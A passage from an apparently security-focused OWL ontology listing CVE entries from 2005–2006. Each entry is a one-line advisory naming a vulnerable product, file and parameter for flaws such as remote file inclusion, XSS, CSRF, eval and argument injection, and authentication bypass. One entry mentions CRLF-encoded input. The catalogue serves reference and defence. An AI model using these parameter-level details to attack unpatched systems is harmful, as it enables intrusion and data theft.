        rdfs:comment "YusASP Web Asset Manager 1.0 allows remote attackers to gain privileges via a direct request to assetmanager.asp."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1674

    Annotations: 
        rdfs:comment "Cross-Site Request Forgery (CSRF) vulnerability in Help Center Live allows remote attackers to perform actions as the administrator via a link or IMG tag to view.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1681

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in common.php in phpATM 1.21, and possibly earlier versions, allows remote attackers to execute arbitrary PHP code via a URL in the include_location parameter to index.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1682

    Annotations: 
        rdfs:comment "** DISPUTED ** JavaMail API, as used by Solstice Internet Mail Server POP3 2.0, does not properly validate the message number in the MimeMessage constructor in javax.mail.internet.InternetHeaders, which allows remote authenticated users to read other users' e-mail messages by modifying the msgno parameter. NOTE: Sun disputes this issue, stating \"The report makes references to source code and files that do not exist in the mentioned products.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1685

    Annotations: 
        rdfs:comment "episodex guestbook allows remote attackers to bypass authentication and edit scripts via a direct request to admin.asp."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1688

    Annotations: 
        rdfs:comment "Wordpress 1.5 and earlier allows remote attackers to obtain sensitive information via a direct request to files in (1) wp-content/themes/, (2) wp-includes/, or (3) wp-admin/, which reveal the path in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1697

    Annotations: 
        rdfs:comment "The RSS module in PostNuke 0.750 and 0.760RC2 and RC3 allows remote attackers to obtain sensitive information via a direct request to simple_smarty.php, which reveals the path in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1698

    Annotations: 
        rdfs:comment "PostNuke 0.750 and 0.760RC3 allows remote attackers to obtain sensitive information via a direct request to (1) theme.php or (2) Xanthia.php in the Xanthia module, (3) user.php, (4) thelang.php, (5) text.php, (6) html.php, (7) menu.php, (8) finclude.php, or (9) button.php in the pnblocks directory in the Blocks module, (10) config.php in the NS-Multisites (aka Multisites) module, or (11) xmlrpc.php, which reveals the path in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1708

    Annotations: 
        rdfs:comment "templates.admin.users.user_form_processing in Blue Coat Reporter before 7.1.2 allows authenticated users to gain administrator privileges via an HTTP POST that sets volatile.user.administrator to true."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1736

    Annotations: 
        rdfs:comment "PROMS 0.11 does not properly handle \"certain combinations of rights,\" which gives more rights to users than intended."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1742

    Annotations: 
        rdfs:comment "BEA WebLogic Server and WebLogic Express 8.1 SP2 and SP3 allows users with the Monitor security role to \"shrink or reset JDBC connection pools.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1745

    Annotations: 
        rdfs:comment "The UserLogin control in BEA WebLogic Portal 8.1 through Service Pack 3 prints the password to standard output when an incorrect login attempt is made, which could make it easier for attackers to guess the correct password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1784

    Annotations: 
        rdfs:comment "Hosting Controller 6.1 HotFix 2.0 and earlier allows remote attackers to steal passwords and gain privileges via a modified emailaddress parameter in an updateprofile action for UserProfile.asp."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1787

    Annotations: 
        rdfs:comment "setup.php in phpStat 1.5 allows remote attackers to bypass authentication and gain administrator privileges by setting the $check variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1794

    Annotations: 
        rdfs:comment "Microsoft Terminal Server using Remote Desktop Protocol (RDP) 5.2 stores an RSA private key in mstlsapi.dll and uses it to sign a certificate, which allows remote attackers to spoof public keys of legitimate servers and conduct man-in-the-middle attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1816

    Annotations: 
        rdfs:comment "Invision Power Board (IPB) 1.0 through 2.0.4 allows non-root admins to add themselves or other users to the root admin group via the \"Move users in this group to\" screen."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1827

    Annotations: 
        rdfs:comment "D-Link DSL-504T allows remote attackers to bypass authentication and gain privileges, such as upgrade firmware, restart the router or restore a saved configuration, via a direct request to firmwarecfg."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1828

    Annotations: 
        rdfs:comment "D-Link DSL-504T stores usernames and passwords in cleartext in the router configuration file, which allows remote attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1835

    Annotations: 
        rdfs:comment "NEXTWEB (i)Site stores databases under the web document root with insufficient access control, which allows remote attackers to obtain sensitive information via a direct request to databases/Users.mdb."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1841

    Annotations: 
        rdfs:comment "The control for Adobe Reader 5.0.9 and 5.0.10 on Linux, Solaris, HP-UX, and AIX creates temporary files with the permissions as specified in a user's umask, which could allow local users to read PDF documents of that user if the umask allows it."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1864

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in cal_admintop.php in Calendarix Advanced 1.5 allows remote attackers to execute arbitrary PHP code via the calpath parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1868

    Annotations: 
        rdfs:comment "I-Man 0.9, and possibly earlier versions, allows remote attackers to execute arbitrary PHP code by uploading a file attachment with a .php extension."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1869

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in start_lobby.php in MWChat 6.x allows remote attackers to execute arbitrary PHP code via the CONFIG[MWCHAT_Libs] parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1870

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in childwindow.inc.php in Popper 1.41-r2 and earlier allows remote attackers to execute arbitrary PHP code via the form parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1876

    Annotations: 
        rdfs:comment "Direct code injection vulnerability in CuteNews 1.3.6 and earlier allows remote attackers with administrative privileges to execute arbitrary PHP code via certain inputs that are injected into a template (.tpl) file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1879

    Annotations: 
        rdfs:comment "LutelWall 0.97 and earlier allows local users to overwrite arbitrary files via a symlink attack on a temporary file created by a system call to wget."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1880

    Annotations: 
        rdfs:comment "everybuddy 0.4.3 and earlier allows local users to overwrite arbitrary files via a symlink attack on a temporary file created by a system call to wget."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1881

    Annotations: 
        rdfs:comment "upload.php in YaPiG 0.92b, 0.93u and 0.94u does not properly restrict the file extension for uploaded image files, which allows remote attackers to upload arbitrary files and execute arbitrary PHP code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1892

    Annotations: 
        rdfs:comment "FlatNuke 2.5.3 allows remote attackers to cause a denial of service or obtain sensitive information via (1) a direct request to foot_news.php, which triggers an infinite loop, or (2) direct requests to unknown scripts, which reveals the web document root in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1894

    Annotations: 
        rdfs:comment "Direct code injection vulnerability in FlatNuke 2.5.3 allows remote attackers to execute arbitrary PHP code by placing the code into the Referer header of an HTTP request, which causes the code to be injected into referer.php, which can then be accessed by the attacker."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1916

    Annotations: 
        rdfs:comment "linki.py in ekg 2005-06-05 and earlier allows local users to overwrite or create arbitrary files via a symlink attack on temporary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1920

    Annotations: 
        rdfs:comment "The (1) Kate and (2) Kwrite applications in KDE KDE 3.2.x through 3.4.0 do not properly set the same permissions on the backup file as were set on the original file, which could allow local users and possibly remote attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1921

    Annotations: 
        rdfs:comment "Eval injection vulnerability in PEAR XML_RPC 1.3.0 and earlier (aka XML-RPC or xmlrpc) and PHPXMLRPC (aka XML-RPC For PHP or php-xmlrpc) 1.1 and earlier, as used in products such as (1) WordPress, (2) Serendipity, (3) Drupal, (4) egroupware, (5) MailWatch, (6) TikiWiki, (7) phpWebSite, (8) Ampache, and others, allows remote attackers to execute arbitrary PHP code via an XML file, which is not properly sanitized before being used in an eval statement."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1941

    Annotations: 
        rdfs:comment "SilverCity before 0.9.5-r1 installs (1) cgi-styler-form.py, (2) cgi-styler.py, and (3) source2html.py with read and write world permissions, which allows local users to execute arbitrary code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1947

    Annotations: 
        rdfs:comment "Cross-site request forgery (CSRF) vulnerability in Invision Gallery before 1.3.1 allows remote attackers to delete albums and images as another user via a link or IMG tag to the (1) albums or (2) delimg actions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1951

    Annotations: 
        rdfs:comment "Multiple HTTP Response Splitting vulnerabilities in osCommerce 2.2 Milestone 2 and earlier allow remote attackers to spoof web content and poison web caches via hex-encoded CRLF (\"%0d%0a\") sequences in the (1) products_id or (2) pid parameter to index.php or (3) goto parameter to banner.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1964

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in utilit.php for Ovidentia Portal allows remote attackers to execute arbitrary PHP code via the babInstallPath parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1971

    Annotations: 
        rdfs:comment "Directory traversal vulnerability in InteractivePHP FusionBB .11 Beta and earlier allows remote attackers to include arbitrary local files via \"..\" sequences in the language parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-1973

    Annotations: 
        rdfs:comment "Java Web Start in Java 2 Platform Standard Edition (J2SE) 5.0 and 5.0 Update 1 allows applications to assign permissions to themselves and gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2027

    Annotations: 
        rdfs:comment "Enterasys Vertical Horizon VH-2402S before firmware 2.05.05.09 does not properly restrict certain debugging commands to the ADMIN account, which could allow attackers to obtain sensitive information or modify the registry."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2059

    Annotations: 
        rdfs:comment "Multiple cross-site request forgery (CSRF) vulnerabilities in (1) addaddress.php, (2) toggleignore.php, (3) removeignore.php, and (4) removeaddress.php in Infopop UBB.Threads before 6.5.2 Beta allow remote attackers to modify settings as another user via a link or IMG tag."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2086

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in viewtopic.php in phpBB 2.0.15 and earlier allows remote attackers to execute arbitrary PHP code."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2154

    Annotations: 
        rdfs:comment "PHP local file inclusion vulnerability in (1) view.php and (2) open.php in osTicket 1.3.1 beta and earlier allows remote attackers to include and possibly execute arbitrary local files via the inc parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2157

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in survey.inc.php for nabopoll 1.2 allows remote attackers to execute arbitrary PHP code via the path parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2160

    Annotations: 
        rdfs:comment "IMail stores usernames and passwords in cleartext in a cookie, which allows remote attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2162

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in form.inc.php3 in MyGuestbook 0.6.1 allows remote attackers to execute arbitrary PHP code via the lang parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2173

    Annotations: 
        rdfs:comment "The Flag::validate and Flag::modify functions in Bugzilla 2.17.1 to 2.18.1 and 2.19.1 to 2.19.3 do not verify that the flag ID is appropriate for the given bug or attachment ID, which allows users to change flags on arbitrary bugs and obtain a bug summary via process_bug.cgi."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2181

    Annotations: 
        rdfs:comment "Cisco 7940/7960 Voice over IP (VoIP) phones do not properly check the Call-ID, branch, and tag values in a NOTIFY message to verify a subscription, which allows remote attackers to spoof messages such as the \"Messages waiting\" message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2182

    Annotations: 
        rdfs:comment "Grandstream BudgeTone (BT) 100 Voice over IP (VoIP) phones do not properly check the Call-ID, branch, and tag values in a NOTIFY message to verify a subscription, which allows remote attackers to spoof messages such as the \"Messages waiting\" message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2188

    Annotations: 
        rdfs:comment "McAfee IntruShield Security Management System obtains the user ID from the URL, which allows remote attackers to guess the Manager account and possibly gain privileges via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2198

    Annotations: 
        rdfs:comment "PHP remote file inclusion vulnerability in lang.php in SPiD before 1.3.1 allows remote attackers to execute arbitrary code via the lang_path parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2209

    Annotations: 
        rdfs:comment "Capturix ScanShare 1.06 build 50 stores sensitive information such as the password in cleartext in capturixss_cfg.ini, which is readable by local users."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2217

    Annotations: 
        rdfs:comment "Dansie Shopping Cart stores the vars.dat file under the web root with insufficient access control, which might allow remote attackers to obtain sensitive information such as program variables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2227

    Annotations: 
        rdfs:comment "Softiacom wMailserver 1.0 stores passwords in plaintext in the Darsite\\MAILSRV\\Admin key, which allows local users to gain administrator privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2263

    Annotations: 
        rdfs:comment "The InstallTrigger.install method in Firefox before 1.0.5 and Mozilla before 1.7.9 allows remote attackers to execute a callback function in the context of another domain by forcing a page navigation after the install method has been called, which causes the callback to be run in the context of the new page and results in a same origin violation."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2281

    Annotations: 
        rdfs:comment "WebEOC before 6.0.2 uses a weak encryption scheme for passwords, which makes it easier for attackers to crack passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2291

    Annotations: 
        rdfs:comment "Oracle JDeveloper 9.0.4, 9.0.5, and 10.1.2 passes the cleartext password as a parameter when starting sqlplus, which allows local users to gain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2301

    Annotations: 
        rdfs:comment "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2314

    Annotations: 
        rdfs:comment "inc.login.php in PHPsFTPd 0.2 through 0.4 allows remote attackers to obtain the administrator's username and password by setting the do_login parameter and performing an edit action using user.php, which causes the login check to be bypassed and leaks the password in the response."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2428

    Annotations: 
        rdfs:comment "Lotus Domino R5 and R6 WebMail, with \"Generate HTML for all fields\" enabled, stores sensitive data from names.nsf in hidden form fields, which allows remote attackers to read the HTML source to obtain sensitive information such as (1) the password hash in the HTTPPassword field, (2) the password change date in the HTTPPasswordChangeDate field, (3) the client platform in the ClntPltfrm field, (4) the client machine name in the ClntMachine field, and (5) the client Lotus Domino release in the ClntBld field, a different vulnerability than CVE-2005-2696."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2459

    Annotations: 
        rdfs:comment "The huft_build function in inflate.c in the zlib routines in the Linux kernel before 2.6.12.5 returns the wrong value, which allows remote attackers to cause a denial of service (kernel crash) via a certain compressed file that leads to a null pointer dereference, a different vulnerability than CVE-2005-2458."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2496

    Annotations: 
        rdfs:comment "The xntpd ntp (ntpd) daemon before 4.2.0b, when run with the -u option and using a string to specify the group, uses the group ID of the user instead of the group, which causes xntpd to run with different privileges than intended."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2498

    Annotations: 
        rdfs:comment "Eval injection vulnerability in PHPXMLRPC 1.1.1 and earlier (PEAR XML-RPC for PHP), as used in multiple products including (1) Drupal, (2) phpAdsNew, (3) phpPgAds, and (4) phpgroupware, allows remote attackers to execute arbitrary PHP code via certain nested XML tags in a PHP document that should not be nested, which are injected into an eval function call, a different vulnerability than CVE-2005-1921."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2741

    Annotations: 
        rdfs:comment "Authorization Services in securityd for Apple Mac OS X 10.3.9 allows local users to gain privileges by granting themselves certain rights that should be restricted to administrators."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2801

    Annotations: 
        rdfs:comment "xattr.c in the ext2 and ext3 file system code for Linux kernel 2.6 does not properly compare the name_index fields when sharing xattr blocks, which could prevent default ACLs from being applied."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2837

    Annotations: 
        rdfs:comment "Multiple eval injection vulnerabilities in PlainBlack Software WebGUI before 6.7.3 allow remote attackers to execute arbitrary Perl code via (1) Help.pm, (2) International.pm, or (3) WebGUI.pm."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2946

    Annotations: 
        rdfs:comment "The default configuration on OpenSSL before 0.9.8 uses MD5 for creating message digests instead of a more cryptographically strong algorithm, which makes it easier for remote attackers to forge certificates with a valid certificate authority signature."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-2969

    Annotations: 
        rdfs:comment "The SSL/TLS server implementation in OpenSSL 0.9.7 before 0.9.7h and 0.9.8 before 0.9.8a, when using the SSL_OP_MSIE_SSLV2_RSA_PADDING option, disables a verification step that is required for preventing protocol version rollback attacks, which allows remote attackers to force a client and server to use a weaker protocol than needed via a man-in-the-middle attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3140

    Annotations: 
        rdfs:comment "Procom NetFORCE 800 4.02 M10 Build 20 and possibly other versions sends the NIS password map (passwd.nis) as a file attachment in diagnostic e-mail messages, which allows remote attackers to obtain the cleartext NIS password hashes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3148

    Annotations: 
        rdfs:comment "StoreBackup before 1.19 does not properly set the uid and guid for symbolic links (1) that are backed up by storeBackup.pl, or (2) recovered by storeBackupRecover.pl, which could cause files to be restored with incorrect ownership."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3170

    Annotations: 
        rdfs:comment "The LDAP client on Microsoft Windows 2000 before Update Rollup 1 for SP4 accepts certificates using LDAP Secure Sockets Layer (LDAPS) even when the Certificate Authority (CA) is not trusted, which could allow attackers to trick users into believing that they are accessing a trusted site."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3286

    Annotations: 
        rdfs:comment "The FWDRV driver in Kerio Personal Firewall 4.2 and Server Firewall 1.1.1 allows local users to cause a denial of service (crash) by setting the PAGE_NOACCESS or PAGE_GUARD protection on the Page Environment Block (PEB), which triggers an exception, aka the \"PEB lockout vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3288

    Annotations: 
        rdfs:comment "Mailsite Express allows remote attackers to upload and execute files with executable extensions such as ASP by attaching the file using the \"compose page\" feature, then accessing the file from the cache directory before saving or sending the message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3296

    Annotations: 
        rdfs:comment "The FTP server in HP-UX 10.20, B.11.00, and B.11.11, allows remote attackers to list arbitrary directories as root by running the LIST command before logging in."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3302

    Annotations: 
        rdfs:comment "Eval injection vulnerability in bvh_import.py in Blender 2.36 allows attackers to execute arbitrary Python code via a hierarchy element in a .bvh file, which is supplied to an eval function call."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3327

    Annotations: 
        rdfs:comment "Network Appliance Data ONTAP 7.0 and earlier allows iSCSI Initiators to bypass iSCSI authentication via a modified client that skips the Security (Start) mode, as required by the Login Negotiation protocol, and uses Operational mode without proving identity."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3335

    Annotations: 
        rdfs:comment "PHP file inclusion vulnerability in bug_sponsorship_list_view_inc.php in Mantis 1.0.0RC2 and 0.19.2 allows remote attackers to execute arbitrary PHP code and include arbitrary local files via the t_core_path parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3435

    Annotations: 
        rdfs:comment "admin_news.php in Archilles Newsworld up to 1.3.0 allows attackers to bypass authentication by obtaining the password hash for another user, for example through another Newsworld vulnerability, and specifying the hash in the pwd argument."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3623

    Annotations: 
        rdfs:comment "nfs2acl.c in the Linux kernel 2.6.14.4 does not check for MAY_SATTR privilege before setting access controls (ACL) on files on exported NFS filesystems, which allows remote attackers to bypass ACLs for readonly mounted NFS filesystems."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3716

    Annotations: 
        rdfs:comment "The SNMP daemon in UTStarcom F1000 VOIP WIFI Phone s2.0 running VxWorks 5.5.1 with kernel WIND 2.6 has hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-3803

    Annotations: 
        rdfs:comment "Cisco IP Phone (VoIP) 7920 1.0(8) contains certain hard-coded (\"fixed\") public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4002

    Annotations: 
        rdfs:comment "WebEOC before 6.0.2 uses the same secret key for all installations, which allows attackers with the key to decrypt data from any WebEOC installation."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4206

    Annotations: 
        rdfs:comment "Blackboard Learning and Community Portal System in Academic Suite 6.3.1.424, 6.2.3.23, and other versions before 6 allows remote attackers to redirect users to other URLs and conduct phishing attacks via a modified url parameter to frameset.jsp, which loads the URL into a frame and causes it to appear to be part of a valid page."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4650

    Annotations: 
        rdfs:comment "Joomla! 1.03 does not restrict the number of \"Search\" Mambots, which allows remote attackers to cause a denial of service (resource consumption) via a large number of Search Mambots."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4699

    Annotations: 
        rdfs:comment "Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via \"--\" style options in the q_Host parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4860

    Annotations: 
        rdfs:comment "Spectrum Cash Receipting System before 6.504 uses weak cryptography (static substitution) in the PASSFILE password file, which makes it easier for local users to gain privileges by decrypting a password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2005-4868

    Annotations: 
        rdfs:comment "Shared memory sections and events in IBM DB2 8.1 have default permissions of read and write for the Everyone group, which allows local users to gain unauthorized access, gain sensitive information, such as cleartext passwords, and cause a denial of service."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-0230

    Annotations: 
        rdfs:comment "Symantec Scan Engine 5.0.0.24, and possibly other versions before 5.1.0.7, uses a client-side check to verify a password, which allows remote attackers to gain administrator privileges via a modified client that sends certain XML requests."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-1058

    Annotations: 
        rdfs:comment "BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-1865

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Beagle before 0.2.5 allows attackers to execute arbitrary commands via crafted filenames that inject command line arguments when Beagle launches external helper applications while indexing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2056

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2057

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2058

    Annotations: 
        rdfs:comment "Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2312

    Annotations: 
        rdfs:comment "Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2428

    Annotations: 
        rdfs:comment "add.asp in DUware DUbanner 3.1 allows remote attackers to execute arbitrary code by uploading files with arbitrary extensions, such as ASP files, probably due to client-side enforcement that can be bypassed. NOTE: some of these details are obtained from third party information, since the raw source is vague."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-2916

    Annotations: 
        rdfs:comment "artswrapper in aRts, when running setuid root on Linux 2.6.0 or later versions, does not check the return value of the setuid function call, which allows local users to gain root privileges by causing setuid to fail, which prevents artsd from dropping privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-3015

    Annotations: 
        rdfs:comment "Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-3211

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in sign.php in cjGuestbook 1.3 and earlier allows remote attackers to inject Javascript code via a javascript URI in an img bbcode tag in the comments parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-3295

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in header.php in Open Guestbook 0.5 allows remote attackers to inject arbitrary web script or HTML via the title parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-3568

    Annotations: 
        rdfs:comment "Multiple cross-site scripting (XSS) vulnerabilities in guestbook.php in Fantastic Guestbook 2.0.1, and possibly earlier versions, allow remote attackers to inject arbitrary web script or HTML via the (1) first_name, (2) last_name, or (3) nickname parameters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-3790

    Annotations: 
        rdfs:comment "The decode_stringmap function in server_transport.cpp for UFO2000 svn 1057 allows remote attackers to cause a denial of service (daemon termination) via a keysize or valsize that is inconsistent with the packet size, which leads to a buffer over-read."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4068

    Annotations: 
        rdfs:comment "The pswd.js script relies on the client to calculate whether a username and password match hard-coded hashed values for a server, and uses a hashing scheme that creates a large number of collisions, which makes it easier for remote attackers to conduct offline brute force attacks. NOTE: this script might also allow attackers to generate the server-side \"secret\" URL without determining the original password, but this possibility was not discussed by the original researcher."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4302

    Annotations: 
        rdfs:comment "The Java Plug-in J2SE 1.3.0_02 through 5.0 Update 5, and Java Web Start 1.0 through 1.2 and J2SE 1.4.2 through 5.0 Update 5, allows remote attackers to exploit vulnerabilities by specifying a JRE version that contain vulnerabilities."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4308

    Annotations: 
        rdfs:comment "Multiple cross-site scripting (XSS) vulnerabilities in Blackboard Learning System 6, Blackboard Learning and Community Portal Suite 6.2.3.23, and Blackboard Vista 4 allow remote attackers to inject arbitrary Javascript, VBScript, or HTML via (1) data, (2) vbscript, and (3) malformed javascript URIs in various HTML tags when posting to the Discussion Board."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4407

    Annotations: 
